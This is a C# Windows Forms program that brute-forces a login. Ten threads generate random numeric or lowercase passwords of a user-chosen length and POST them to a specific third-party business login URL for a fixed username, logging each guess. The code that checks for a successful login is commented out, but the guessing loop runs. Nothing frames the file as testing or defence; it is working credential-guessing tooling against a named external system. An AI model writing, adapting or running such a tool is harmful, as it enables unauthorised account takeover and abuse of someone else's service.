using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace main._2019_5
{
    public partial class 登录验证 : Form
    {
        public 登录验证()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }

        private void 登录验证_Load(object sender, EventArgs e)
        {

        }

        bool status = true;

        public void run()
        {
            for (int i = 0; i < 999999; i++)
            {
                Random rd = new Random();
                string password = "";
                if (radioButton1.Checked == true)
                {
                    for (int j = 0; j < Convert.ToInt32(textBox1.Text); j++)
                    {
                        password += rd.Next(0, 9).ToString();
                    }


                }

                else if(radioButton2.Checked==true)
                    {
                    char[] codes = {
        '0','1','2','3','4','5','6','7','8','9',
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'
        //'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
      };
                    for (int j = 0; j < Convert.ToInt32(textBox1.Text); j++)
                    {
                        password += codes[rd.Next(0, 35)].ToString();
                    }
                   
                }

                else if (radioButton3.Checked == true)
                {
                    char[] codes = {
       
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'
        //'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
      };
                    for (int j = 0; j < Convert.ToInt32(textBox1.Text); j++)
                    {
                        password += codes[rd.Next(0, 25)].ToString();
                    }

                }


                string code = "";

                string url = "https://xjdsbusiness.creditchinese.com/boss-master/a/login";
                string data = "username=WM2001&password="+password+ "&validateCode="+code;
                string cookie = "";
                string html = method.PostUrl(url, data, cookie, "utf-8");

                ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count + 1).ToString()); //使用Listview展示数据         
                lv1.SubItems.Add(password.ToString());
                //if (html.Contains("密码错误") || html=="验证码")
                //{
                //    lv1.SubItems.Add("错误");
                //}
                //else
                //{
                //    lv1.SubItems.Add("密码正确");
                //    return;
                //}
                lv1.SubItems.Add("错误");

                if (status == false)
                    return;
                {
                }
                if (listView1.Items.Count > 2)
                {
                    listView1.EnsureVisible(listView1.Items.Count - 1);  //滚动到指定位置
                }


            }
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            status = true;
            for (int i = 0; i < 10; i++)
            {
                Thread thread = new Thread(new ThreadStart(run));
                thread.Start();
            }
            
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            status = false;
        }
    }
}
